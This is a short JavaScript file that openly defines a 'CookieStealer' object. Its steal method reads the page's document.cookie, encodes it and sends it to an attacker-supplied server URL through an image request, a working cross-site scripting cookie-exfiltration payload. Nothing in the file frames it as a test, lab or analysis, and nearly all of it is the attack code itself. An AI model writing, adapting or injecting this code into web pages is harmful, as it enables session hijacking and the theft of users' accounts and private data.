console.log("Defining CookieStealer");

var CookieStealer = function(Args){

  this.mServerURL = Args[0];
  this.mServerCookieStealer = Args[1];

}

CookieStealer.prototype = {

  constructor : CookieStealer,
  
  steal : function() {

    this.mCookies = document.cookie;
    var encodedCookies = encodeURIComponent(this.mCookies);
    var fullURL = this.mServerURL + this.mServerCookieStealer + encodedCookies;
    
    console.log('Sending stealed cookies to :' + fullURL);
    new Image().src = fullURL;
  },

  printCookies : function() {
    console.log('Your cookies are :');
    console.log(this.mCookies);
    console.log('\n');
  }
}

